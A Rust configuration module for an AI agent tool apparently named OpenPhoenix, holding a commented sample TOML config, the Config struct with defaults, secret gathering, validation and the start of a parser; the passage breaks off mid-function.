use std::env;
use std::fs;
use std::path::{Path, PathBuf};

pub const PRIVACY_MODES: [&str; 3] = ["ghost", "session", "recall"];
pub const VERBOSE_LEVELS: [&str; 3] = ["off", "on", "full"];
pub const TRACE_LEVELS: [&str; 3] = ["off", "on", "raw"];
pub const REASONING_VISIBILITY: [&str; 2] = ["off", "on"];
pub const FAST_LEVELS: [&str; 3] = ["off", "on", "default"];
pub const THINKING_LEVELS: [&str; 9] = [
    "default", "off", "minimal", "low", "medium", "adaptive", "high", "xhigh", "max",
];
pub const LEAN_LEVELS: [&str; 3] = ["off", "lean", "grunt"];
pub const LOG_LEVELS: [&str; 5] = ["off", "error", "warn", "info", "debug"];

pub const HEARTBEAT_PROMPT: &str = "Read HEARTBEAT.md in the workspace if it \
exists and follow it. If nothing needs attention, reply exactly HEARTBEAT_OK.";

pub const SAMPLE_CONFIG: &str = r#"# OpenPhoenix - https://github.com/Paulus1337/OpenPhoenix
# Secrets never have to live in this file. Every token below is read from the
# environment first, then the encrypted store (`phoenix secret set NAME`), so a
# container can inject them and keep this file free of key material.
# No PHOENIX_API_KEY? The provider's standard env var is picked up too:
# ANTHROPIC_API_KEY, OPENAI_API_KEY, OPENROUTER_API_KEY, NVIDIA_API_KEY,
# GEMINI_API_KEY / GOOGLE_API_KEY.

[log]
level = "error"              # off | error | warn | info | debug; JSON lines to stderr

[provider]
kind = "openai"             # anthropic | openai | openrouter | ollama | nvidia | google | custom
model = "gpt-5.6-sol"       # aliases work too: opus, sonnet, gpt, gemini, …
# api_key = ""              # prefer env: PHOENIX_API_KEY or the vars above
# base_url = ""             # ollama / custom OpenAI-compatible endpoints
# fallbacks = []            # models tried in order after provider errors; "provider/model" switches provider
# api_keys = []             # extra keys rotated on rate limits (first = api_key)
# timeout_secs = 0          # 0 = built-in call timeouts (180s chat, 300s stream)
# [provider.headers]        # extra headers on every model call; values may use ${ENV_VAR}
# x-prompt-cache = "on"
# [provider.keys]           # per-provider key rings for cross-provider fallbacks
# openrouter = ["key1", "key2"]

[agent]
privacy = "session"          # ghost = no history, no disk | session | recall
lean = "off"                 # off | lean | grunt (max token savings)
# thinking = "off"           # model reasoning effort
# reasoning_visible = false  # /reasoning shows safe public work updates, never hidden chain-of-thought
# tool_list = true           # false = skip the tool inventory line in the system prompt
workspace = "~/phoenix"
# sessions = false           # serve: keep per-chat history on disk (never in ghost)
# stream = false             # chat: print tokens as they arrive
# compact_after = 0          # summarize the oldest half when history exceeds N messages

[security]
confirm_shell = true
# approvals = true           # queue serve-mode shell commands for /approve (off by default)
allow_outside_workspace = false
# audit_log = true           # append JSONL audit records to ~/.openphoenix/audit.jsonl
deny_commands = []           # extra regexes on top of built-ins
deny_tools = []              # tool names the agent may never call
# confirm_tools = []         # tools that need a yes first: chat asks inline, serve queues for /approve
# allow_domains = []         # egress allowlist for http_get/web_search/browser; empty = any public host
# deny_domains = []          # egress denylist, matches subdomains too, wins over allow_domains
# allow_private_network = false # true = web tools may reach private/loopback addresses (trusted LANs only)

[telegram]
# token = ""                 # prefer env: PHOENIX_TELEGRAM_TOKEN
allowed_chat_ids = []        # empty = refuse everyone (fail closed)
# group_mention_only = true  # groups: only answer when the bot is @mentioned

# [http]
# enabled = false            # POST /run, bearer token required
# port = 8787
# bind = "127.0.0.1"         # 127.0.0.1 = this machine only, 0.0.0.0 = all IPv4, :: = all
# token = ""                 # prefer env: PHOENIX_HTTP_TOKEN
# web = false                # embedded chat UI on GET / (off by default)
# username = ""              # required for the web UI (fail closed)
# password = ""              # "sha256:<hex>"; prefer env: PHOENIX_HTTP_PASS
# headers = "strong"         # security headers; "minimal" to reduce
# allow_crawlers = []        # robots.txt allowlist; empty = deny all + X-Robots-Tag

# [whatsapp]                 # WhatsApp Business Cloud API channel
# token = ""                 # prefer env: PHOENIX_WHATSAPP_TOKEN
# phone_id = ""              # business phone number id
# verify_token = ""          # prefer env: PHOENIX_WHATSAPP_VERIFY_TOKEN
# webhook_port = 8788        # 127.0.0.1 webhook listener; proxy it publicly
# allowed_numbers = []       # E.164 without plus, empty = refuse everyone

# [discord]                  # Discord bot over the raw gateway websocket
# token = ""                 # prefer env: PHOENIX_DISCORD_TOKEN
# allowed_channel_ids = []   # empty = refuse everyone (fail closed)

# [slack]                    # Slack bot over Socket Mode (no public webhook)
# app_token = ""             # xapp-, prefer env: PHOENIX_SLACK_APP_TOKEN
# bot_token = ""             # xoxb-, prefer env: PHOENIX_SLACK_BOT_TOKEN
# allowed_channel_ids = []   # empty = refuse everyone (fail closed)

# [matrix]                   # Matrix via the client-server API
# homeserver = ""            # like "https://matrix.org"
# token = ""                 # prefer env: PHOENIX_MATRIX_TOKEN
# user_id = ""               # like "@bot:matrix.org"
# allowed_rooms = []         # empty = refuse everyone (fail closed)

# [mattermost]               # Mattermost via the websocket API
# url = ""                   # like "https://chat.example.com"
# token = ""                 # prefer env: PHOENIX_MATTERMOST_TOKEN
# allowed_channel_ids = []   # empty = refuse everyone (fail closed)

# [signal]                   # Signal via a supervised signal-cli daemon
# account = ""               # your E.164, like "+4915551234567"
# allowed_numbers = []       # empty = refuse everyone (fail closed)
# cli_path = "signal-cli"    # binary on PATH or absolute path
# http_port = 8789           # localhost JSON-RPC/SSE port for the daemon

# [dreaming]                 # serve: think while idle, write to the journal
# minutes = 0                # dream after N idle minutes; 0 = disabled
# prompt = ""                # empty = built-in reflective prompt

# [update]                   # serve: keep the update cache fresh for `phoenix status`
# check_hours = 0            # check for a new release every N hours; 0 = disabled (never applies, only checks)

# [registry]                 # skill registry for `phoenix skill` commands
# url = "https://clawhub.ai"

# [heartbeat]                # serve: run a check-in prompt on a fixed cadence
# minutes = 0                # 0 = disabled
# prompt = ""                # empty = built-in HEARTBEAT.md prompt
# chat_ids = []              # empty = all telegram allowed chats
# can_act = false            # false = observe-only: no shell, writes, sends, or browser

# [memory]                   # vector search over recall-mode notes
# embeddings = false         # rank recall results by embedding similarity
# embed_model = "text-embedding-3-small"
# embed_base_url = ""        # empty = provider base_url or api.openai.com/v1

# [browser]                  # drive a system Chromium over local CDP
# enabled = false            # registers the browser_* tools (off by default)
# cdp_url = ""               # attach to a running browser, localhost only
# binary = "/usr/bin/chromium"
# headless = true

# [audio]                    # telegram voice notes -> text
# transcribe = false
# model = "whisper-1"
# base_url = ""              # empty = provider base_url or api.openai.com/v1

# [media]                    # image generation + speech tools
# images = false             # enable the image_generate tool
# tts = false                # enable the speak tool
# video = false              # enable the video_generate tool
# music = false              # enable the music_generate tool
# image_model = "gpt-image-1"
# tts_model = "tts-1"
# tts_voice = "alloy"
# video_model = "sora-2"
# music_model = "music-1"

# [canvas]                   # rendered visual surface at GET /canvas
# enabled = false            # needs [http] enabled plus web credentials

# [board]                    # durable task cards (task_add/list/update)
# enabled = false

# [imessage]                 # macOS only: drives the imsg CLI
# enabled = false
# cli_path = "imsg"          # imsg binary (needs Full Disk Access)
# db_path = ""               # optional Messages chat.db override
# allowed_senders = []       # fail closed: empty list refuses to start

# [job_defaults]             # delivery for jobs that name none
# chat_ids = []              # default chats for job results
# webhook = ""               # default webhook POST target
# can_act = true             # false = observe-only default for jobs that do not set it

# [[jobs]]
# name = "morning-brief"
# cron = "0 7 * * *"
# prompt = "Summarize the TODO file in my workspace."
# chat_ids = []              # optional: deliver only to these chats
# webhook = ""               # optional: POST result JSON here instead
# expect = ""                # optional: flag the run when this marker is missing from the result
# can_act = true             # false = observe-only: no shell, writes, sends, or browser
# precheck = ""              # optional shell gate: non-zero exit skips the run (no model call)
# script = ""                # instead of prompt: run this shell command, deliver its output
# model = ""                 # optional "provider/model" override for this job only
"#;

pub fn home_dir() -> PathBuf {
    env::var("HOME")
        .or_else(|_| env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

pub fn home() -> PathBuf {
    if let Ok(v) = env::var("PHOENIX_STATE_DIR") {
        if !v.is_empty() {
            return PathBuf::from(v);
        }
    }
    match env::var("PHOENIX_HOME") {
        Ok(v) if !v.is_empty() => PathBuf::from(v),
        _ => home_dir().join(".openphoenix"),
    }
}

pub fn config_path() -> PathBuf {
    if let Ok(v) = env::var("PHOENIX_CONFIG_PATH") {
        if !v.is_empty() {
            return expanduser(&v);
        }
    }
    let nest = home();
    let direct = nest.join("config.toml");
    if direct.exists() {
        return direct;
    }
    let nested = nest.join(".openphoenix").join("config.toml");
    if nested.exists() {
        return nested;
    }
    direct
}

pub fn expanduser(raw: &str) -> PathBuf {
    if raw == "~" {
        home_dir()
    } else if let Some(rest) = raw.strip_prefix("~/") {
        home_dir().join(rest)
    } else {
        PathBuf::from(raw)
    }
}

#[derive(Debug, Clone)]
pub struct Job {
    pub webhook: String,
    pub name: String,
    pub cron: String,
    pub prompt: String,
    pub chat_ids: Vec<String>,
    pub expect: String,
    pub can_act: bool,
    pub precheck: String,
    pub script: String,
    pub model: String,
}

#[derive(Debug, Clone)]
pub struct Config {
    pub log_level: String,
    pub provider: String,
    pub model: String,
    pub api_key: String,
    pub base_url: String,
    pub api: String,
    pub provider_timeout_secs: u64,
    pub provider_headers: Vec<(String, String)>,
    pub privacy: String,
    pub lean: String,
    pub max_retries: u32,
    pub thinking: String,
    pub verbose: String,
    pub trace: String,
    pub reasoning_visible: bool,
    pub fast_model: String,
    pub prev_model: String,
    pub workspace: PathBuf,
    pub confirm_shell: bool,
    pub approvals: bool,
    pub vault_cmd: String,
    pub allow_outside_workspace: bool,
    pub allow_private_network: bool,
    pub audit_log: bool,
    pub deny_commands: Vec<String>,
    pub deny_tools: Vec<String>,
    pub confirm_tools: Vec<String>,
    pub allow_domains: Vec<String>,
    pub deny_domains: Vec<String>,
    pub telegram_token: String,
    pub telegram_allowed: Vec<String>,
    pub tg_group_mention_only: bool,
    pub tg_parse_mode: String,
    pub jobs: Vec<Job>,
    pub fallbacks: Vec<String>,
    pub sessions: bool,
    pub tool_list: bool,
    pub stream: bool,
    pub http_enabled: bool,
    pub http_port: u16,
    pub http_bind: String,
    pub http_token: String,
    pub http_web: bool,
    pub http_headers: String,
    pub http_user: String,
    pub http_pass: String,
    pub http_allow_crawlers: Vec<String>,
    pub wa_token: String,
    pub wa_phone_id: String,
    pub wa_verify_token: String,
    pub wa_webhook_port: u16,
    pub wa_allowed: Vec<String>,
    pub discord_token: String,
    pub discord_allowed: Vec<String>,
    pub slack_app_token: String,
    pub slack_bot_token: String,
    pub slack_allowed: Vec<String>,
    pub signal_account: String,
    pub signal_allowed: Vec<String>,
    pub signal_cli_path: String,
    pub signal_http_port: u16,
    pub irc_server: String,
    pub irc_port: u16,
    pub irc_tls: bool,
    pub irc_nick: String,
    pub irc_channels: Vec<String>,
    pub irc_allowed: Vec<String>,
    pub matrix_homeserver: String,
    pub matrix_token: String,
    pub matrix_user_id: String,
    pub matrix_allowed: Vec<String>,
    pub mattermost_url: String,
    pub mattermost_token: String,
    pub mattermost_allowed: Vec<String>,
    pub dream_minutes: u32,
    pub dream_prompt: String,
    pub update_check_hours: u32,
    pub clawhub_url: String,
    pub heartbeat_minutes: u32,
    pub heartbeat_prompt: String,
    pub heartbeat_chat_ids: Vec<String>,
    pub heartbeat_can_act: bool,
    pub compact_after: u32,
    pub mem_embeddings: bool,
    pub mem_embed_model: String,
    pub mem_embed_base_url: String,
    pub api_keys: Vec<String>,
    pub provider_keys: Vec<(String, Vec<String>)>,
    pub audio_transcribe: bool,
    pub audio_model: String,
    pub audio_base_url: String,
    pub media_images: bool,
    pub media_tts: bool,
    pub media_video: bool,
    pub media_music: bool,
    pub media_image_model: String,
    pub media_tts_model: String,
    pub media_tts_voice: String,
    pub media_video_model: String,
    pub media_music_model: String,
    pub media_base_url: String,
    pub canvas_enabled: bool,
    pub board_enabled: bool,
    pub pairing_enabled: bool,
    pub sandbox_runtime: String,
    pub sandbox_image: String,
    pub sandbox_network: String,
    pub sandbox_memory: String,
    pub sandbox_cpus: String,
    pub sandbox_read_only: bool,
    pub imessage_enabled: bool,
    pub imessage_cli_path: String,
    pub imessage_db_path: String,
    pub imessage_allowed: Vec<String>,
    pub browser_enabled: bool,
    pub mcp_servers: Vec<crate::mcp::ServerCfg>,
    pub hooks: Vec<crate::hooks::Hook>,
    pub browser_cdp_url: String,
    pub browser_binary: String,
    pub browser_headless: bool,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            log_level: "error".into(),
            provider: "openai".into(),
            provider_timeout_secs: 0,
            provider_headers: Vec::new(),
            model: "gpt-5.6-sol".into(),
            api_key: String::new(),
            base_url: String::new(),
            api: String::new(),
            privacy: "session".into(),
            lean: "off".into(),
            max_retries: 3,
            thinking: "off".into(),
            verbose: "off".into(),
            trace: "off".into(),
            reasoning_visible: false,
            fast_model: String::new(),
            prev_model: String::new(),
            workspace: home_dir().join("phoenix"),
            confirm_shell: true,
            approvals: false,
            vault_cmd: String::new(),
            allow_private_network: false,
            allow_outside_workspace: false,
            audit_log: false,
            deny_commands: Vec::new(),
            deny_tools: Vec::new(),
            confirm_tools: Vec::new(),
            allow_domains: Vec::new(),
            deny_domains: Vec::new(),
            telegram_token: String::new(),
            telegram_allowed: Vec::new(),
            tg_group_mention_only: true,
            tg_parse_mode: "html".into(),
            jobs: Vec::new(),
            fallbacks: Vec::new(),
            sessions: false,
            tool_list: true,
            stream: false,
            http_enabled: false,
            http_port: 8787,
            http_bind: "127.0.0.1".to_string(),
            http_token: String::new(),
            http_web: false,
            http_headers: "strong".to_string(),
            http_user: String::new(),
            http_pass: String::new(),
            http_allow_crawlers: Vec::new(),
            wa_token: String::new(),
            wa_phone_id: String::new(),
            wa_verify_token: String::new(),
            wa_webhook_port: 8788,
            wa_allowed: Vec::new(),
            discord_token: String::new(),
            discord_allowed: Vec::new(),
            slack_app_token: String::new(),
            slack_bot_token: String::new(),
            slack_allowed: Vec::new(),
            signal_account: String::new(),
            signal_allowed: Vec::new(),
            signal_cli_path: String::new(),
            signal_http_port: 8789,
            irc_server: String::new(),
            irc_port: 6697,
            irc_tls: true,
            irc_nick: String::new(),
            irc_channels: Vec::new(),
            irc_allowed: Vec::new(),
            matrix_homeserver: String::new(),
            matrix_token: String::new(),
            matrix_user_id: String::new(),
            matrix_allowed: Vec::new(),
            mattermost_url: String::new(),
            mattermost_token: String::new(),
            mattermost_allowed: Vec::new(),
            dream_minutes: 0,
            update_check_hours: 0,
            dream_prompt: String::new(),
            clawhub_url: "https://clawhub.ai".to_string(),
            heartbeat_minutes: 0,
            heartbeat_prompt: HEARTBEAT_PROMPT.to_string(),
            heartbeat_chat_ids: Vec::new(),
            heartbeat_can_act: false,
            compact_after: 0,
            mem_embeddings: false,
            mem_embed_model: "text-embedding-3-small".to_string(),
            mem_embed_base_url: String::new(),
            api_keys: Vec::new(),
            provider_keys: Vec::new(),
            audio_transcribe: false,
            audio_model: "whisper-1".to_string(),
            audio_base_url: String::new(),
            media_images: false,
            media_tts: false,
            media_video: false,
            media_music: false,
            media_image_model: "gpt-image-1".to_string(),
            media_tts_model: "tts-1".to_string(),
            media_tts_voice: "alloy".to_string(),
            media_video_model: "sora-2".to_string(),
            media_music_model: "music-1".to_string(),
            media_base_url: String::new(),
            canvas_enabled: false,
            board_enabled: false,
            pairing_enabled: false,
            sandbox_runtime: "none".into(),
            sandbox_image: crate::sandbox::DEFAULT_IMAGE.into(),
            sandbox_network: "none".into(),
            sandbox_memory: crate::sandbox::DEFAULT_MEMORY.into(),
            sandbox_cpus: crate::sandbox::DEFAULT_CPUS.into(),
            sandbox_read_only: false,
            imessage_enabled: false,
            imessage_cli_path: "imsg".to_string(),
            imessage_db_path: String::new(),
            imessage_allowed: Vec::new(),
            browser_enabled: false,
            mcp_servers: Vec::new(),
            hooks: Vec::new(),
            browser_cdp_url: String::new(),
            browser_binary: String::new(),
            browser_headless: true,
        }
    }
}

impl Config {
    pub fn secret_values(&self) -> Vec<String> {
        let mut out: Vec<String> = Vec::new();
        let mut push = |v: &str| {
            if !v.is_empty() && !out.iter().any(|x| x == v) {
                out.push(v.to_string());
            }
        };
        push(&self.api_key);
        if let Ok(value) = std::env::var("GOOGLE_OAUTH_ACCESS_TOKEN") {
            push(&value);
        }
        for name in [
            "CLAUDE_AI_SESSION_KEY",
            "CLAUDE_WEB_SESSION_KEY",
            "CLAUDE_WEB_COOKIE",
        ] {
            if let Ok(value) = std::env::var(name) {
                push(&value);
            }
        }
        for k in &self.api_keys {
            push(k);
        }
        for (_, keys) in &self.provider_keys {
            for k in keys {
                push(k);
            }
        }
        for (name, value) in &self.provider_headers {
            if crate::security::is_secret_env_name(name)
                || matches!(
                    name.to_ascii_lowercase().as_str(),
                    "authorization" | "proxy-authorization" | "cookie" | "set-cookie"
                )
            {
                push(value);
            }
        }
        for server in &self.mcp_servers {
            for (name, value) in &server.env {
                if crate::security::is_secret_env_name(name) {
                    push(value);
                }
            }
        }
        if let Some(tokens) = crate::oauth::load() {
            push(&tokens.access);
            push(&tokens.refresh);
        }
        if let Some(tokens) = crate::codex::load() {
            push(&tokens.access);
            push(&tokens.refresh);
        }
        push(&self.telegram_token);
        push(&self.http_token);
        push(&self.http_pass);
        push(&self.wa_token);
        push(&self.wa_verify_token);
        push(&self.discord_token);
        push(&self.slack_app_token);
        push(&self.slack_bot_token);
        push(&self.matrix_token);
        push(&self.mattermost_token);
        out
    }

    pub fn validate(&self) -> Result<(), String> {
        if !LOG_LEVELS.contains(&self.log_level.as_str()) {
            return Err(format!("log.level must be one of {LOG_LEVELS:?}"));
        }
        if !PRIVACY_MODES.contains(&self.privacy.as_str()) {
            return Err(format!("privacy must be one of {PRIVACY_MODES:?}"));
        }
        if !LEAN_LEVELS.contains(&self.lean.as_str()) {
            return Err(format!("lean must be one of {LEAN_LEVELS:?}"));
        }
        if !THINKING_LEVELS.contains(&self.thinking.as_str()) {
            return Err(format!("thinking must be one of {THINKING_LEVELS:?}"));
        }
        if !VERBOSE_LEVELS.contains(&self.verbose.as_str()) {
            return Err(format!("verbose must be one of {VERBOSE_LEVELS:?}"));
        }
        if !TRACE_LEVELS.contains(&self.trace.as_str()) {
            return Err(format!("trace must be one of {TRACE_LEVELS:?}"));
        }
        if !self.api.is_empty() && !crate::providers::API_DIALECTS.contains(&self.api.as_str()) {
            return Err(format!(
                "provider.api must be one of {:?}",
                crate::providers::API_DIALECTS
            ));
        }
        for (field, value) in [
            ("signal.cli_path", &self.signal_cli_path),
            ("imessage.cli_path", &self.imessage_cli_path),
            ("browser.binary", &self.browser_binary),
        ] {
            if !value.is_empty() && !crate::security::safe_executable(value) {
                return Err(format!(
                    "{field} is not a safe executable name or path: {value:?}"
                ));
            }
        }
        for (field, list) in [
            ("security.allow_domains", &self.allow_domains),
            ("security.deny_domains", &self.deny_domains),
        ] {
            for entry in list.iter() {
                if entry.trim().is_empty() {
                    return Err(format!("{field} has an empty entry"));
                }
                if entry.contains("://") || entry.contains('/') {
                    return Err(format!(
                        "{field} takes bare host names like \"example.com\", not {entry:?}"
                    ));
                }
            }
        }
        Ok(())
    }
}

fn tbl<'a>(root: &'a toml::Value, name: &str) -> Option<&'a toml::value::Table> {
    root.get(name).and_then(|v| v.as_table())
}

pub fn expand_env_refs(raw: &str, lookup: &dyn Fn(&str) -> Option<String>) -> String {
    if !raw.contains("${") {
        return raw.to_string();
    }
    let bytes = raw.as_bytes();
    let mut out = String::with_capacity(raw.len());
    let mut i = 0usize;
    while i < bytes.len() {
        if bytes[i] != b'$' {
            let ch_len = raw[i..].chars().next().map_or(1, char::len_utf8);
            out.push_str(&raw[i..i + ch_len]);
            i += ch_len;
            continue;
        }
        let escaped = bytes.get(i + 1) == Some(&b'$') && bytes.get(i + 2) == Some(&b'{');
        let name_start = i + if escaped { 3 } else { 2 };
        if !escaped && bytes.get(i + 1) != Some(&b'{') {
            out.push('$');
            i += 1;
            continue;
        }
        let Some(rel_end) = raw[name_start..].find('}') else {
            out.push('$');
            i += 1;
            continue;
        };
        let name = &raw[name_start..name_start + rel_end];
        let valid = !name.is_empty()
            && name
                .chars()
                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
            && !name.starts_with(|c: char| c.is_ascii_digit());
        if !valid {
            out.push('$');
            i += 1;
            continue;
        }
        if escaped {
            out.push_str(&format!("${{{name}}}"));
        } else {
            match lookup(name) {
                Some(v) => out.push_str(&v),
                None => out.push_str(&format!("${{{name}}}")),
            }
        }
        i = name_start + rel_end + 1;
    }
    out
}

pub fn expand_env(raw: &str) -> String {
    expand_env_refs(raw, &|k| env::var(k).ok())
}

fn get_str(t: Option<&toml::value::Table>, key: &str, default: &str) -> String {
    let raw = t
        .and_then(|t| t.get(key))
        .and_then(|v| v.as_str())
        .unwrap_or(default);
    expand_env(raw)
}

fn get_bool(t: Option<&toml::value::Table>, key: &str, default: bool) -> bool {
    t.and_then(|t| t.get(key))
        .and_then(|v| v.as_bool())
        .unwrap_or(default)
}

pub const PROVIDER_KINDS: &[&str] = &[
    "anthropic",
    "openai",
    "openrouter",
    "ollama",
    "google",
    "nvidia",
    "groq",
    "mistral",
    "deepseek",
    "xai",
    "moonshot",
    "cohere",
    "together",
    "novita",
    "opencode",
    "byteplus",
    "volcengine",
    "xiaomi",
    "meta",
    "huggingface",
    "custom",
];

pub fn known_kind(kind: &str) -> bool {
    PROVIDER_KINDS.contains(&kind)
}

pub fn uses_namespaced_models(kind: &str) -> bool {
    matches!(
        kind,
        "nvidia" | "openrouter" | "together" | "novita" | "huggingface" | "opencode"
    )
}

pub fn switch_provider(cfg: &mut Config, kind: &str) {
    if kind == cfg.provider {
        return;
    }
    cfg.provider = kind.to_string();
    cfg.base_url = String::new();
    cfg.api = String::new();
    cfg.api_key = String::new();
    cfg.api_keys = Vec::new();
    if let Some((_, keys)) = cfg.provider_keys.iter().find(|(p, _)| *p == cfg.provider) {
        if let Some((first, rest)) = keys.split_first() {
            cfg.api_key = first.clone();
            cfg.api_keys = rest.to_vec();
        }
    }
    if cfg.api_key.is_empty() {
        for var in provider_key_vars(&cfg.provider) {
            if let Some(v) = crate::secrets::resolve_chain(&cfg.vault_cmd, var, var) {
                cfg.api_key = v;
                if cfg.api_keys.is_empty() {
                    cfg.api_keys = crate::secrets::ring_extras(var);
                }
                break;
            }
        }
    }
    if cfg.api_key.is_empty() {
        if let Ok(v) = env::var("PHOENIX_API_KEY") {
            if !v.is_empty() {
                cfg.api_key = v;
            }
        }
    }
}

pub fn retarget(cfg: &mut Config, spec: &str) {
    let (kind, model) = match spec.split_once('/') {
        Some((k, _)) if k == cfg.provider && uses_namespaced_models(k) => {
            (cfg.provider.clone(), spec.to_string())
        }
        Some((k, m)) if known_kind(k) => (k.to_string(), m.to_string()),
        _ => (cfg.provider.clone(), spec.to_string()),
    };
    switch_provider(cfg, &kind);
    cfg.model = model;
}

fn get_headers_table(t: Option<&toml::value::Table>, key: &str) -> Vec<(String, String)> {
    t.and_then(|t| t.get(key))
        .and_then(toml::Value::as_table)
        .map(|tbl| {
            tbl.iter()
                .filter_map(|(k, v)| {
                    let val = v.as_str()?;
                    let k = k.trim();
                    let val = expand_env(val.trim());
                    if k.is_empty() || val.is_empty() {
                        None
                    } else {
                        Some((k.to_string(), val))
                    }
                })
                .collect()
        })
        .unwrap_or_default()
}

fn get_keys_table(t: Option<&toml::value::Table>, key: &str) -> Vec<(String, Vec<String>)> {
    t.and_then(|t| t.get(key))
        .and_then(toml::Value::as_table)
        .map(|tbl| {
            tbl.iter()
                .map(|(k, v)| {
                    let list: Vec<String> = match v {
                        toml::Value::Array(a) => a
                            .iter()
                            .filter_map(|x| x.as_str().map(str::to_string))
                            .filter(|s| !s.is_empty())
                            .collect(),
                        toml::Value::String(s) if !s.is_empty() => vec![s.clone()],
                        _ => Vec::new(),
                    };
                    (k.clone(), list)
                })
                .filter(|(_, l)| !l.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

fn get_str_list(t: Option<&toml::value::Table>, key: &str) -> Vec<String> {
    t.and_then(|t| t.get(key))
        .and_then(|v| v.as_array())
        .map(|a| {
            a.iter()
                .map(|v| match v {
                    toml::Value::String(s) => expand_env(s),
                    other => other.to_string(),
                })
                .collect()
        })
        .unwrap_or_default()
}

pub fn parse(raw: &str) -> Result<Config, String> {
    let root: toml::Value = if raw.trim().is_empty() {
        toml::Value::Table(toml::value::Table::new())
    } else {
        toml::from_str(raw).map_err(|e| format!("bad config: {e}"))?
    };
    let log = tbl(&root, "log");
    let prov = tbl(&root, "provider");
    let agent = tbl(&root, "agent");
    let sec = tbl(&root, "security");
    let tg = tbl(&root, "telegram");
    let http = tbl(&root, "http");
    let wa = tbl(&root, "whatsapp");
    let dc = tbl(&root, "discord");
    let sl = tbl(&root, "slack");
    let sg = tbl(&root, "signal");
    let irc = tbl(&root, "irc");
    let mx = tbl(&root, "matrix");
    let mm = tbl(&root, "mattermost");
    let dr = tbl(&root, "dreaming");
    let ch = tbl(&root, "clawhub");
    let hb = tbl(&root, "heartbeat");
    let mem = tbl(&root, "memory");
    let audio = tbl(&root, "audio");
    let media = tbl(&root, "media");
    let browser = tbl(&root, "browser");

    let workspace_raw = get_str(agent, "workspace", "~/phoenix");

    let deny_commands = sec
        .and_then(|t| t.get("deny_commands"))
        .and_then(|v| v.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|v| v.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default();
    let deny_tools = get_str_list(sec, "deny_tools");
    let confirm_tools = get_str_list(sec, "confirm_tools");
    let allow_domains = get_str_list(sec, "allow_domains");
    let deny_domains = get_str_list(sec, "deny_domains");

    let telegram_allowed = get_str_list(tg, "allowed_chat_ids");

    let http_port = http
        .and_then(|t| t.get("port"))
        .and_then(|v| v.as_integer())
        .unwrap_or(8787);
    if !(1..=65535).contains(&http_port) {
        return Err("http.port must be between 1 and 65535".into());
    }

    let http_bind = get_str(http, "bind", "127.0.0.1");
    if http_bind.trim().is_empty() {
        return Err("http.bind must not be empty".into());
    }
    if http_bind.parse::<std::net::IpAddr>().is_err() {
        return Err(format!(
            "http.bind must be an IP address, got {http_bind:?}; use 127.0.0.1 for local only, \
0.0.0.0 for every IPv4 interface, or :: for every interface"
        ));
    }

    let wa_webhook_port = wa
        .and_then(|t| t.get("webhook_port"))
        .and_then(|v| v.as_integer())
        .unwrap_or(8788);
    if !(1..=65535).contains(&wa_webhook_port) {
        return Err("whatsapp.webhook_port must be between 1 and 65535".into());
    }

    let signal_http_port = sg
        .and_then(|t| t.get("http_port"))
        .and_then(toml::Value::as_integer)
        .unwrap_or(8789);
    if !(1..=65535).contains(&signal_http_port) {
        return Err("signal.http_port must be between 1 and 65535".into());
    }
    let signal_http_port = signal_http_port as u16;
    let heartbeat_minutes = hb
        .and_then(|t| t.get("minutes"))
        .and_then(|v| v.as_integer())
        .unwrap_or(0);
    if heartbeat_minutes < 0 {
        return Err("heartbeat.minutes must be >= 0".into());
    }
    let heartbeat_prompt = get_str(hb, "prompt", "");
    let heartbeat_prompt = if heartbeat_prompt.is_empty() {
        HEARTBEAT_PROMPT.to_string()
    } else {
        heartbeat_prompt
    };

    let compact_after = agent
        .and_then(|t| t.get("compact_after"))
        .and_then(|v| v.as_integer())
        .unwrap_or(0);
    if compact_after < 0 {
        return Err("agent.compact_after must be >= 0".into());
    }

    let jd = root.get("job_defaults").and_then(|v| v.as_table());
    let jd_webhook = get_str(jd, "webhook", "");
    let jd_chat_ids = get_str_list(jd, "chat_ids");
    let jd_can_act = get_bool(jd, "can_act", true);
    let mut jobs: Vec<Job> = root
        .get("jobs")
        .and_then(|v| v.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|v| v.as_table())
                .map(|t| Job {
                    name: t
                        .get("name")
                        .and_then(|v| v.as_str())
                        .unwrap_or("job")
                        .to_string(),
                    cron: t
                        .get("cron")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    prompt: t
                        .get("prompt")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    chat_ids: get_str_list(Some(t), "chat_ids"),
                    expect: t
                        .get("expect")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    can_act: t
                        .get("can_act")
                        .and_then(toml::Value::as_bool)
                        .unwrap_or(jd_can_act),
                    precheck: t
                        .get("precheck")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    script: t
                        .get("script")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    model: t
                        .get("model")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                    webhook: t
                        .get("webhook")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string(),
                })
                .collect()
        })
        .unwrap_or_default();
    for j in &mut jobs {
        if j.webhook.is_empty() && j.chat_ids.is_empty() {
            j.webhook = jd_webhook.clone();
            j.chat_ids = jd_chat_ids.clone();
        }
        if !j.prompt.is_empty() && !j.script.is_empty() {
            return Err(format!("job {}: set prompt or script, not both", j.name));
        }
    }

    let tg_parse_mode = get_str(tg, "parse_mode", "html");
    if !["html", "plain"].contains(&tg_parse_mode.as_str()) {
        return Err("telegram.parse_mode must be \"html\" or \"plain\"".into());
    }

    let cfg = Config {
        log_level: get_str(log, "level", "error"),
        provider: get_str(prov, "kind", "openai"),
        provider_timeout_secs: {
            let t = prov
                .and_then(|t| t.get("timeout_secs"))
                .and_then(|v| v.as_integer())
                .unwrap_or(0);
            if !(0..=3600).contains(&t) {
                return Err("provider.timeout_secs must be between 0 and 3600".into());
            }
            t as u64
        },
        model: get_str(prov, "model", "gpt-5.6-sol"),
        api_key: get_str(prov, "api_key", ""),
        base_url: get_str(prov, "base_url", ""),
        api: get_str(prov, "api", ""),
